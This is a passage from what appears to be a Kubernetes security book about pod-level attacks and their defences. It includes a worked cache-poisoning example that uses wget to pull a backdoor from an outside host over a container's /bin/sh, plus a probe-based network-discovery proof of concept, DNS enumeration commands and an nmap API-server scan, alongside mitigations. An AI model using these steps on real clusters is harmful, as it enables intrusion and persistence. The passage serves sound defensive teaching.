  <code class="nt">namespace</code><code class="p">:</code> <code class="l-Scalar-Plain">default</code></pre>

<p>From within a pod it’s possible to infer the current<a data-type="indexterm" data-primary="DNS" data-secondary="resolver configuration, pod namespaces" id="idm45302818310080"/> namespace from the DNS resolver configuration in <em>/etc/resolv.conf</em> (which is <code>secret-namespace</code> in this example):</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code>grep -o <code class="s2">"search [^ ]*"</code> /etc/resolv.conf
search secret-namespace.svc.cluster.local</pre>

<p>Other less-robust options include the mounted service account (assuming it’s in the same namespace, which it may not
be), or the cluster’s DNS resolver (if you can enumerate or scrape it).</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Environment Variables"><div class="sect2" id="idm45302818302752">
<h2>Environment Variables</h2>

<p>Now we’re getting <a data-type="indexterm" data-primary="pods" data-secondary="environment variables" id="idm45302818301120"/><a data-type="indexterm" data-primary="environment variables" data-secondary="pods" id="idm45302818300112"/><a data-type="indexterm" data-primary="security" data-secondary="pods, environment variables" id="idm45302818299168"/>into interesting configuration. We want to see the environment variables in a pod, partially because
they may leak secret information (which should have been mounted as a file), and also because they may list
which other services are available in the namespace and so suggest other network routes and applications to attack.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>Passwords set<a data-type="indexterm" data-primary="passwords, visibility" id="idm45302818296816"/><a data-type="indexterm" data-primary="YAML Ain’t Markup Language" data-secondary="password visibility and" id="idm45302818296080"/><a data-type="indexterm" data-primary="APIs (application programming interfaces), password visibility and" id="idm45302818295120"/><a data-type="indexterm" data-primary="application programming interfaces (APIs)" data-secondary="password visibility and" id="idm45302818294480"/> in deployment and pod YAML are visible to the operator that deploys the YAML, the
process at runtime and any other processes that can read its environment, and to anybody that can read from the
Kubernetes or <code>kubelet</code> APIs.</p>
</div>

<p>Here we see the <a data-type="indexterm" data-primary="containers" data-secondary="ports" id="idm45302818268320"/><a data-type="indexterm" data-primary="ports, containers" id="idm45302818267312"/>container’s <code>PORT</code> (which is good practice and required by applications running in Knative, Google Cloud Run, and
some other systems), the DNS names and ports of its coordinating services, some badly set database config and
credentials, and finally a sensibly referenced Secret file:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">spec</code><code class="p">:</code>
  <code class="nt">containers</code><code class="p">:</code>
  <code class="p-Indicator">-</code> <code class="nt">env</code><code class="p">:</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">PORT</code>
      <code class="nt">value</code><code class="p">:</code> <code class="s">"8080"</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">CURRENCY_SERVICE_ADDR</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">currencyservice:7000</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">SHIPPING_SERVICE_ADDR</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">shippingservice:50051</code>
<code class="c1"># These environment variables should be set in secrets</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">DATABASE_ADDR</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">postgres:5432</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">DATABASE_USER</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">secret_user_name</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">DATABASE_PASSWORD</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">the_secret_password</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">DATABASE_NAME</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">users</code>
<code class="c1"># This is a safer way to reference secrets and configuration</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">MY_SECRET_FILE</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">/mnt/secrets/foo.toml</code></pre>

<p>That wasn’t too bad, right? Let’s move on to container images.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Container Images"><div class="sect2" id="idm45302818263968">
<h2>Container Images</h2>

<p>The container image’s filesystem <a data-type="indexterm" data-primary="container images" data-secondary="vulnerabilities" id="cont_img_vuln"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="container images" id="vuln_cont_img"/>is of paramount importance, as it may hold vulnerabilities that assist
in privilege escalation. If you’re not patching regularly, Captain Hashjack might get the same image from a<a data-type="indexterm" data-primary="public registries" data-secondary="container images" id="idm45302818136064"/> public
registry to scan it for vulnerabilities they may be able to exploit. Knowing what binaries and files are available also
enables attack<a data-type="indexterm" data-primary="attacks" data-secondary="container images" id="idm45302818134832"/> planning “offline,” so adversaries can be more stealthy and targeted when attacking the live system.</p>
<div data-type="tip"><h6>Tip</h6>
<p>The OCI registry <a data-type="indexterm" data-primary="OCI (Open Container Initiative)" data-secondary="registry" id="idm45302818132656"/>specification allows arbitrary<a data-type="indexterm" data-primary="container images" data-secondary="OCI registry" id="idm45302818131456"/> image layer storage: it’s a two-step process and the first step uploads
the manifest, with the second uploading the blob. If an attacker only performs the second step they gain free
arbitrary blob storage.</p>

<p>Most registries don’t index this automatically (with Harbour being the exception), and so they
will store the “orphaned” layers forever, potentially hidden from view until manually garbage collected.</p>
</div>

<p>Here we see an image referenced by <a data-type="indexterm" data-primary="labels" data-secondary="container images, referencing" id="idm45302818129168"/>label, which means we can’t tell what the actual SHA256 hash digest of the container
image is. The container tag could have been updated since this deployment as it’s not referenced by digest:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">image</code><code class="p">:</code> <code class="l-Scalar-Plain">gcr.io/google-samples/microservices-demo/frontend:v0.2.3</code></pre>

<p>Instead of using image tags, we can use the SHA256 image digests to pull the image by its content address:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">image</code><code class="p">:</code> <code class="l-Scalar-Plain">gcr.io/google-samples/microservices-demo/frontend@sha256:ca5d97b6cec...</code></pre>

<p>Images should always be referenced by <a data-type="indexterm" data-primary="SHA256, referencing container images" id="idm45302818119664"/>SHA256 or use signed tags; otherwise, it’s impossible to know what’s running
as the label may have been updated in the registry since the container start. You can validate what’s being run
by inspecting the running container for its image’s SHA256.</p>

<p class="pagebreak-before">It’s possible to specify both a tag and an SHA256 digest in a Kubernetes <code>image:</code> key,<a data-type="indexterm" data-primary="image: key, container images" id="idm45302818117552"/> in which case the tag is
ignored and the image is retrieved by digest. This leads to potentially confusing image definitions including a tag and SHA256 such as  the following being retrieved as the image matching the SHA rather than the tag:</p>

<pre data-type="programlisting">controlplane/bizcard:latest\ <a class="co" id="co_pod_level_resources_CO1-1" href="#callout_pod_level_resources_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a>
@sha256:649f3a84b95ee84c86d70d50f42c6d43ce98099c927f49542c1eb85093953875 <a class="co" id="co_pod_level_resources_CO1-2" href="#callout_pod_level_resources_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_pod_level_resources_CO1-1" href="#co_pod_level_resources_CO1-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Container name, plus the ignored “latest” tag</p></dd>
<dt><a class="co" id="callout_pod_level_resources_CO1-2" href="#co_pod_level_resources_CO1-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>Image SHA256, which overrides the “latest” tag defined in the previous line</p></dd>
</dl>

<p>being retrieved as the image matching the SHA rather than the tag.</p>

<p>If an attacker can influence the local <code>kubelet</code> image <a data-type="indexterm" data-primary="kubelet" data-secondary="image cache, security considerations" id="idm45302818083488"/>cache, they can add malicious
code to an image and relabel it on the worker node (note: to run this again,
don’t forget to remove the <code>cidfile</code>):</p>

<pre data-type="programlisting" data-code-language="bash"><code class="nv">$ </code><code>docker</code><code> </code><code>run</code><code> </code><code>-it</code><code> </code><code>--cidfile</code><code class="o">=</code><code>cidfile</code><code> </code><code>--entrypoint</code><code> </code><code>/bin/busybox</code><code> </code><code class="se">\
</code><code>  </code><code>gcr.io/google-samples/microservices-demo/frontend:v0.2.3</code><code> </code><code class="se">\
</code><code>  </code><code>wget</code><code> </code><code>https://securi.fyi/b4shd00r</code><code> </code><code>-O</code><code> </code><code>/bin/sh</code><code> </code><a class="co" id="co_pod_level_resources_CO2-1" href="#callout_pod_level_resources_CO2-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a><code>

</code><code class="nv">$ </code><code>docker</code><code> </code><code>commit</code><code> </code><code class="k">$(</code><code>&lt;</code><code>cidfile</code><code class="k">)</code><code> </code><code class="se">\
</code><code>  </code><code>gcr.io/google-samples/microservices-demo/frontend:v0.2.3</code><code> </code><a class="co" id="co_pod_level_resources_CO2-2" href="#callout_pod_level_resources_CO2-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_pod_level_resources_CO2-1" href="#co_pod_level_resources_CO2-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>Load a malicious shell backdoor and overwrite the container’s default command (<code>/bin/sh</code>).</p></dd>
<dt><a class="co" id="callout_pod_level_resources_CO2-2" href="#co_pod_level_resources_CO2-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>Commit the changed container using the same.</p></dd>
</dl>

<p>While the compromise of a local registry cache may lead to this attack, container cache access
probably comes by rooting the node, and so this may be the least of your worries.</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>The image pull policy of <code>Always</code> has <a data-type="indexterm" data-primary="Always, performance considerations" id="idm45302818027120"/><a data-type="indexterm" data-primary="image pull policies, Always" id="idm45302818026320"/>a performance drawback in highly dynamic,
“autoscaling from zero” environments such as Knative. When startup times
are crucial, a potentially multisecond <code>imagePullPolicy</code> latency is unacceptable
and image digests must be used.</p>
</div>

<p>This attack on a local image cache can be mitigated with an image pull policy of <code>Always</code>, which will ensure the local tag matches what’s defined in the registry it’s pulled from.
This is important and you should always be mindful of this setting:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">imagePullPolicy</code><code class="p">:</code> <code class="l-Scalar-Plain">Always</code></pre>

<p>Typos in <a data-type="indexterm" data-primary="typos, container image names" id="idm45302817993936"/>container image names, or registry names, will deploy unexpected code if
an adversary has “typosquatted” the image with a malicious container.</p>

<p>This can be difficult to detect when only a single character changes—for example,
<code>controlplan/hack</code> instead of <code>controlplane/hack</code>.
Tools like Notary protect against this by checking for valid signatures from trusted parties.
If a TLS-intercepting middleware box intercepts and rewrites an image tag,
a spoofed image may be deployed.</p>

<p>Again, TUF and Notary side-channel signing mitigates against this, as do other
container signing approaches like <code>cosign</code>, as discussed<a data-type="indexterm" data-primary="container images" data-secondary="vulnerabilities" data-startref="cont_img_vuln" id="idm45302817990624"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="container images" data-startref="vuln_cont_img" id="idm45302817989344"/> in <a data-type="xref" href="ch04.xhtml#ch-apps-supply-chain">Chapter 4</a>.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Pod Probes"><div class="sect2" id="idm45302818139632">
<h2>Pod Probes</h2>

<p>Your liveness <a data-type="indexterm" data-primary="pods" data-secondary="probes" id="idm45302817985984"/><a data-type="indexterm" data-primary="probes" id="idm45302817984976"/><a data-type="indexterm" data-primary="security" data-secondary="pod probes" id="idm45302817984304"/>probes should be tuned to your application’s performance characteristics, and used to keep them alive in
the stormy waters of your production environment. Probes inform Kubernetes if the application is incapable of fulfilling
its specified purpose, perhaps through a crash or external system failure.</p>

<p>The Kubernetes audit finding <a href="https://oreil.ly/OWnq6">TOB-K8S-024</a> shows
probes can be subverted by an attacker <a data-type="indexterm" data-primary="attacks" data-secondary="pod probes" id="idm45302817981616"/>with the ability to schedule pods: without changing the pod’s <code>command</code>
or <code>args</code> they have the power to make network requests and execute commands within the target container. This
yields local network discovery to an attacker as the probes are executed by the <code>kubelet</code> on the host networking
interface, and not from within the pod.</p>

<p>A <code>host</code> header <a data-type="indexterm" data-primary="headers" data-secondary="pod probes" id="idm45302817958448"/>can be used here to enumerate the local network. The proof of concept exploit is as follows:</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="nt">apiVersion </code><code class="p">:</code> <code class="l-Scalar-Plain">v1</code>
<code class="nt">kind </code><code class="p">:</code> <code class="l-Scalar-Plain">Pod</code>
<code class="c1"># ...</code>
<code class="nt">livenessProbe</code><code class="p">:</code>
  <code class="nt">httpGet</code><code class="p">:</code>
    <code class="nt">host</code><code class="p">:</code> <code class="l-Scalar-Plain">172.31.6.71</code>
    <code class="nt">path</code><code class="p">:</code> <code class="l-Scalar-Plain">/</code>
    <code class="nt">port</code><code class="p">:</code> <code class="l-Scalar-Plain">8000</code>
    <code class="nt">httpHeaders </code><code class="p">:</code>
    <code class="p-Indicator">-</code> <code class="nt">name</code><code class="p">:</code> <code class="l-Scalar-Plain">Custom-Header</code>
      <code class="nt">value</code><code class="p">:</code> <code class="l-Scalar-Plain">Awesome</code></pre>
</div></section>













<section data-type="sect2" data-pdf-bookmark="CPU and Memory Limits and Requests"><div class="sect2" id="idm45302817955968">
<h2>CPU and Memory Limits and Requests</h2>

<p>Resource <a data-type="indexterm" data-primary="resource limits" id="idm45302817931824"/><a data-type="indexterm" data-primary="memory" data-secondary="resource limits" id="idm45302817931088"/><a data-type="indexterm" data-primary="cgroups" data-secondary="resource limits" id="idm45302817930144"/>limits and requests which manage the pod’s <code>cgroups</code> prevent the exhaustion of finite memory and compute
resources on the <code>kubelet</code> host, and defend from <a data-type="indexterm" data-primary="fork bombs" id="idm45302817894368"/>fork bombs and runaway <a data-type="indexterm" data-primary="processes" data-secondary="runaway" id="idm45302817893568"/>processes. Networking <a data-type="indexterm" data-primary="bandwidth limits" id="idm45302817892464"/>bandwidth limits are not
supported in the pod spec, but may be supported by your CNI implementation.</p>

<p><code>cgroups</code> are a useful resource constraint. <code>cgroups</code>
v2 offers more protection, but <code>cgroups</code> v1 are not a security boundary and
<a href="https://oreil.ly/uDhso">they can be escaped easily</a>.</p>

<p>Limits restrict the potential <a data-type="indexterm" data-primary="cryptomining" id="idm45302817888992"/>cryptomining or resource exhaustion that a malicious container <a data-type="indexterm" data-primary="containers" data-secondary="malicious, resource limits" id="idm45302817888160"/>can execute. It also stops
the host becoming overwhelmed by bad <a data-type="indexterm" data-primary="deployment, resource limits" id="idm45302817887024"/>
<span class="keep-together">deployments.</span> It has limited effectiveness against an adversary looking to
further exploit the system unless they need to use a memory-hungry attack:</p>

<pre data-type="programlisting" data-code-language="yaml">    <code class="nt">resources</code><code class="p">:</code>
      <code class="nt">limits</code><code class="p">:</code>
        <code class="nt">cpu</code><code class="p">:</code> <code class="l-Scalar-Plain">200m</code>
        <code class="nt">memory</code><code class="p">:</code> <code class="l-Scalar-Plain">128Mi</code>
      <code class="nt">requests</code><code class="p">:</code>
        <code class="nt">cpu</code><code class="p">:</code> <code class="l-Scalar-Plain">100m</code>
        <code class="nt">memory</code><code class="p">:</code> <code class="l-Scalar-Plain">64Mi</code></pre>
</div></section>













<section data-type="sect2" data-pdf-bookmark="DNS"><div class="sect2" id="idm45302817883840">
<h2>DNS</h2>

<p>By default Kubernetes DNS <a data-type="indexterm" data-primary="DNS" data-secondary="namespace segregation" id="DNS_secconsid"/>servers provide all records for services across the cluster,
preventing namespace segregation
unless deployed individually per-namespace or domain.</p>
<div data-type="tip"><h6>Tip</h6>
<p>CoreDNS supports <a data-type="indexterm" data-primary="CoreDNS" data-secondary="policy plug-ins" id="idm45302817866384"/><a data-type="indexterm" data-primary="policies" data-secondary="plugins, CoreDNS support" id="idm45302817865376"/>policy plug-ins, including OPA, to restrict access to DNS records and defeat the following
enumeration attacks.</p>
</div>

<p>The default Kubernetes CoreDNS <a data-type="indexterm" data-primary="CoreDNS" id="CoreDNS_seconsid"/>installation leaks information about its services,
and offers an attacker a view of all possible network endpoints (see
<a data-type="xref" href="#tweet-rory-hard-dns">Figure 2-10</a>). Of course they may not all be accessible due to a
network policy in place, as we will see in <a data-type="xref" href="ch05.xhtml#workload-network-policies">“Traffic Flow Control”</a>.</p>

<p>DNS enumeration <a data-type="indexterm" data-primary="DNS" data-secondary="enumeration, CoreDNS and" id="idm45302817860160"/><a data-type="indexterm" data-primary="clusters" data-secondary="namespaces, DNS enumeration" id="idm45302817831024"/><a data-type="indexterm" data-primary="namespaces" data-secondary="clusters, DNS enumeration" id="idm45302817830176"/>can be performed against a default, unrestricted CoreDNS installation.
To retrieve all services in the cluster namespace (output edited to fit):</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="l-Scalar-Plain">root@hack-3-fc58fe02:/ [0]# dig +noall +answer \</code>
  <code class="l-Scalar-Plain">srv any.any.svc.cluster.local |</code>
  <code class="l-Scalar-Plain">sort --human-numeric-sort --key 7</code>

<code class="l-Scalar-Plain">any.any.svc.cluster.local. 30 IN SRV 0 6 53 kube-dns.kube-system.svc.cluster...</code>
<code class="l-Scalar-Plain">any.any.svc.cluster.local. 30 IN SRV 0 6 80 frontend-external.default.svc.clu...</code>
<code class="l-Scalar-Plain">any.any.svc.cluster.local. 30 IN SRV 0 6 80 frontend.default.svc.cluster.local.</code>
<code class="nn">...</code></pre>

<figure class="width-65"><div id="tweet-rory-hard-dns" class="figure">
<img src="Images/haku_0211.png" alt="tweet-rory-hard-dns" width="1248" height="1535"/>
<h6><span class="label">Figure 2-10. </span>The wisdom of Rory McCune on the difficulties of hard multitenancy</h6>
</div></figure>

<p>For all service endpoints<a data-type="indexterm" data-primary="service endpoints, DNS enumeration" id="idm45302817825968"/> and names do the following (output edited to fit):</p>

<pre data-type="programlisting" data-code-language="yaml"><code class="l-Scalar-Plain">root@hack-3-fc58fe02:/ [0]# dig +noall +answer \</code>
  <code class="l-Scalar-Plain">srv any.any.any.svc.cluster.local |</code>
  <code class="l-Scalar-Plain">sort --human-numeric-sort --key 7</code>

<code class="l-Scalar-Plain">any.any.any.svc.cluster.local. 30 IN SRV 0 3 53 192-168-155-129.kube-dns.kube...</code>
<code class="l-Scalar-Plain">any.any.any.svc.cluster.local. 30 IN SRV 0 3 53 192-168-156-130.kube-dns.kube...</code>
<code class="l-Scalar-Plain">any.any.any.svc.cluster.local. 30 IN SRV 0 3 3550 192-168-156-133.productcata...</code>
<code class="nn">...</code></pre>

<p>To return an IPv4 address <a data-type="indexterm" data-primary="IPv4 addresses, DNS enumeration" id="idm45302817815840"/>based on the query:</p>

<pre data-type="programlisting">root@hack-3-fc58fe02:/ [0]# dig +noall +answer 1-3-3-7.default.pod.cluster.local

1-3-3-7.default.pod.cluster.local. 23 IN A      1.3.3.7</pre>

<p class="less_space pagebreak-before">The Kubernetes API server service IP information is mounted into the pod’s environment by default:</p>

<pre data-type="programlisting" data-code-language="text">root@test-pd:~ [0]# env | grep KUBE
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT_443_TCP=tcp://10.7.240.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.7.240.1
KUBERNETES_SERVICE_HOST=10.7.240.1
KUBERNETES_PORT=tcp://10.7.240.1:443
KUBERNETES_PORT_443_TCP_PORT=443

root@test-pd:~ [0]# curl -k \
  https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version

{
  "major": "1",
  "minor": "19+",
  "gitVersion": "v1.19.9-gke.1900",
  "gitCommit": "008fd38bf3dc201bebdd4fe26edf9bf87478309a",
# ...</pre>

<p>The response matches the API server’s <code>/version</code> endpoint.</p>
<div data-type="tip"><h6>Tip</h6>
<p>You can detect Kubernetes API <a data-type="indexterm" data-primary="API server" data-secondary="detecting" id="idm45302817737648"/><a data-type="indexterm" data-primary="nmap scripts, detecting" id="idm45302817736672"/>servers with
<a href="https://oreil.ly/PAqte">this nmap script</a>
and the following function:</p>

<pre data-type="programlisting" data-code-language="shell">nmap-kube-apiserver<code class="o">()</code> <code class="o">{</code>
    <code class="nb">local </code><code class="nv">REGEX</code><code class="o">=</code><code class="s2">"major.*gitVersion.*buildDate"</code>
    <code class="nb">local </code><code class="nv">ARGS</code><code class="o">=</code><code class="s2">"</code><code class="si">${</code><code class="p">@</code><code class="k">:-$(</code>kubectl config view --minify <code class="p">|</code>
        awk <code class="s1">'/server:/{print $2}'</code> <code class="p">|</code>
        sed -E -e <code class="s1">'s,^https?://,,'</code> -e <code class="s1">'s,:, -p ,g'</code><code class="k">)</code><code class="si">}</code><code class="s2">"</code>

    nmap <code class="se">\</code>
        --open <code class="se">\</code>
        --script<code class="o">=</code>http-get <code class="se">\</code>
        --script-args <code class="s2">"\</code>
<code class="s2">            http-get.path=/version, \</code>
<code class="s2">            http-get.match="</code><code class="si">${</code><code class="nv">REGEX</code><code class="si">}</code><code class="s2">", \</code>
<code class="s2">            http-get.showResponse, \</code>
<code class="s2">            http-get.forceTls \</code>
<code class="s2">        "</code> <code class="se">\</code>
        <code class="si">${</code><code class="nv">ARGS</code><code class="si">}</code>
<code class="o">}</code></pre>
</div>

<p>Next up is an important runtime policy piece: the securityContext, initially
introduced by<a data-type="indexterm" data-primary="CoreDNS" data-startref="CoreDNS_seconsid" id="idm45302817778336"/><a data-type="indexterm" data-primary="DNS" data-secondary="namespace segregation" data-startref="DNS_secconsid" id="idm45302817666576"/> Red Hat.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Pod securityContext"><div class="sect2" id="idm45302817869744">
<h2>Pod securityContext</h2>

<p>This pod is running <a data-type="indexterm" data-primary="pod security context, capabilities" id="pod_seccontext"/><a data-type="indexterm" data-primary="capabilities" data-secondary="pod security context" id="capab_podseccontext"/>with an empty <code>securityContext</code>, <a data-type="indexterm" data-primary="securityContext" data-secondary="pods" id="idm45302817661088"/><a data-type="indexterm" data-primary="security" data-secondary="securityContext" data-tertiary="pods" id="idm45302817660080"/>which means that without
admission controllers mutating the configuration at deployment time, the container
can run a root-owned process and has all
capabilities available to it:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">securityContext</code><code class="p">:</code> <code class="p-Indicator">{}</code></pre>

<p>Exploiting the capability landscape involves an understanding of the kernel’s flags, and
<a href="https://oreil.ly/mtvCX">Stefano Lanaro’s guide</a> provides
a comprehensive 
<span class="keep-together">overview.</span></p>

<p>Different capabilities <a data-type="indexterm" data-primary="capabilities" data-secondary="security considerations" id="idm45302817656624"/>may have particular impact on a system, and <code>CAP_SYS_ADMIN</code> and <code>CAP_BPF</code> are particularly
enticing to an attacker. Notable capabilities you should be cautious about granting include:</p>
<dl>
<dt><code>CAP_DAC_OVERRIDE</code>, <code>CAP_CHOWN</code>, <code>CAP_DAC_READ_SEARCH</code>, <code>CAP_FORMER</code>, <code>CAP_SETFCAP</code></dt>
<dd>
<p>Bypass <a data-type="indexterm" data-primary="filesystem permissions" data-secondary="bypassing" id="idm45302817649440"/>filesystem permissions</p>
</dd>
<dt><code>CAP_SETUID</code>, <code>CAP_SETGID</code></dt>
<dd>
<p>Become the root user</p>
</dd>
<dt><code>CAP_NET_RAW</code></dt>
<dd>
<p>Read network traffic</p>
</dd>
<dt><code>CAP_SYS_ADMIN</code></dt>
<dd>
<p>Filesystem mount permission</p>
</dd>
<dt><code>CAP_SYS_PTRACE</code></dt>
<dd>
<p>All-powerful debugging of other processes</p>
</dd>
<dt><code>CAP_SYS_MODULE</code></dt>
<dd>
<p>Load kernel modules to bypass controls</p>
</dd>
<dt><code>CAP_PERFMON</code>, <code>CAP_BPF</code></dt>
<dd>
<p>Access deep-hooking BPF systems</p>
</dd>
</dl>

<p>These are the precursors for many <a data-type="indexterm" data-primary="container breakouts" data-secondary="capabilities" id="idm45302817616944"/>container breakouts. As <a href="https://oreil.ly/swfMU">Brad Geesaman</a>
points out in <a data-type="xref" href="#tweet-brad-not-a-container-escape">Figure 2-11</a>, processes want to be
free! And an adversary will take advantage of anything within the pod they
can use to escape.</p>

<figure class="width-75"><div id="tweet-brad-not-a-container-escape" class="figure">
<img src="Images/haku_0212.png" alt="haku 0212" width="832" height="276"/>
<h6><span class="label">Figure 2-11. </span>Brad Geesaman’s evocative container freedom cry</h6>
</div></figure>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p><code>CAP_NET_RAW</code> is enabled <a data-type="indexterm" data-primary="UDP poisoning" id="idm45302817610336"/><a data-type="indexterm" data-primary="ICMP poisoning" id="idm45302817609600"/><a data-type="indexterm" data-primary="ARP (Address Resolution Protocol)" data-secondary="poisoning" id="idm45302817608928"/>by default in <code>runc</code>, and enables UDP (which bypasses TCP service meshes like Istio), ICMP messages, and ARP poisoning attacks. <a href="https://oreil.ly/ceARf">Aqua found DNS poisoning attacks</a> against Kubernetes DNS, and the <code>net.ipv4.ping_group_range</code> <code>sysctl</code> flag means <a href="https://oreil.ly/tJ7rQ">it should be dropped when needed for ICMP</a>.</p>
</div>

<p>These are some <a data-type="indexterm" data-primary="root capabilities, container breakouts" id="idm45302817604368"/>container breakouts requiring <code>root</code> and/or <code>CAP_SYS_ADMIN</code>, <code>CAP_NET_RAW</code>, <code>CAP_BPF</code>, or <code>CAP_SYS_MODULE</code>  to
function:</p>

<ul>
<li>
<p>Subpath volume mount traversal and <em>/proc/self/exe</em> (both described in <a data-type="xref" href="ch06.xhtml#ch-storage">Chapter 6</a>).</p>
</li>
<li>
<p><a href="https://oreil.ly/ZdYJ8">CVE-2016-5195</a> is a read-only memory copy-on-write race condition,
aka DirtyCow, and detailed in <a data-type="xref" href="ch04.xhtml#architecting-apps-resilience">“Architecting Containerized Apps for Resilience”</a>.</p>
</li>
<li>
<p><a href="https://oreil.ly/Scrau">CVE-2020-14386</a> is an unprivileged memory corruption bug that requires <code>CAP_NET_RAW</code>.</p>
</li>
<li>
<p><a href="https://oreil.ly/QzkuG">CVE-2021-30465</a>,
<code>runc</code> mount destinations symlink-exchange swap to mount outside the <code>rootfs</code>, limited by use of unprivileged user.</p>
</li>
<li>
<p><a href="https://oreil.ly/Zj1Rl">CVE-2021-22555</a> is a
<code>Netfilter</code> heap<a data-type="indexterm" data-primary="container breakouts" data-secondary="Netfilter" id="idm45302817590528"/><a data-type="indexterm" data-primary="CVEs (Common Vulnerabilities and Exposures)" data-secondary="Netfilter" id="idm45302817808192"/><a data-type="indexterm" data-primary="security" data-secondary="CVEs" data-tertiary="Netfilter" id="idm45302817588800"/> out-of-bounds write that requires <code>CAP_NET_RAW</code>.</p>
</li>
<li>
<p><a href="https://oreil.ly/VLeQK">CVE-2021-31440</a> is <code>eBPF</code> out-of-bounds access to the Linux kernel requiring root or <code>CAP_BPF</code>, and <code>CAPS_SYS_MODULE</code>.</p>
</li>
<li>
<p><a href="https://oreil.ly/wlzra">@andreyknvl</a> kernel bugs and <a href="https://oreil.ly/RWlF0"><code>core_pattern</code> escape</a>.</p>
</li>
</ul>

<p>When there’s no breakout, root capabilities are still required for a number of other attacks, such as <a href="https://oreil.ly/XoxVW">CVE-2020-10749</a> which are Kubernetes CNI plug-in person-in-the-middle
(PitM) attacks via IPv6 rogue router advertisements.</p>
<div data-type="tip"><h6>Tip</h6>
<p>The excellent<a data-type="indexterm" data-primary="Compendium of Container Escapes" id="idm45302817579168"/> <a href="https://oreil.ly/LAGB9">“A Compendium of Container Escapes”</a> goes into more detail on some of these attacks.</p>
</div>

<p>We enumerate the options available in a <code>securityContext</code> for a pod to defend itself
from hostile <a data-type="indexterm" data-primary="pod security context, capabilities" data-startref="pod_seccontext" id="idm45302817576528"/><a data-type="indexterm" data-primary="capabilities" data-secondary="pod security context" data-startref="capab_podseccontext" id="idm45302817575488"/>containers in <a data-type="xref" href="ch08.xhtml#policy-runtime-policies">“Runtime Policies”</a>.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Pod Service Accounts"><div class="sect2" id="idm45302817664768">
<h2>Pod Service Accounts</h2>

<p>Service Accounts <a data-type="indexterm" data-primary="pods" data-secondary="service accounts" id="idm45302817571856"/><a data-type="indexterm" data-primary="service accounts" id="idm45302817570848"/><a data-type="indexterm" data-primary="authentication" data-secondary="service accounts" id="idm45302817570176"/><a data-type="indexterm" data-primary="authorization" data-secondary="service accounts" id="idm45302817569232"/>are JSON Web Tokens (JWTs) <a data-type="indexterm" data-primary="JSON Web Tokens (JWTs)" id="idm45302817568160"/><a data-type="indexterm" data-primary="JWTs (JSON Web Tokens)" id="idm45302817567488"/><a data-type="indexterm" data-primary="API server" data-secondary="JWTs" id="idm45302817566816"/>and are used by a pod for authentication and authorization to the API server.
The default service account shouldn’t be given any permissions, and by default comes with no authorization.</p>

<p>A pod’s <code>serviceAccount</code> configuration defines its access privileges with the API server;
see <a data-type="xref" href="ch08.xhtml#service-accounts">“Service accounts”</a> for the details. The service account is mounted into
all pod replicas, and which share the single “workload identity”:</p>

<pre data-type="programlisting" data-code-language="yaml">  <code class="nt">serviceAccount</code><code class="p">:</code> <code class="l-Scalar-Plain">default</code>
  <code class="nt">serviceAccountName</code><code class="p">:</code> <code class="l-Scalar-Plain">default</code></pre>

<p>Segregating duty in this way reduces the blast radius if a pod is compromised:
limiting an attacker post-intrusion is a primary goal of policy controls.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Scheduler and Tolerations"><div class="sect2" id="idm45302817559344">
<h2>Scheduler and Tolerations</h2>

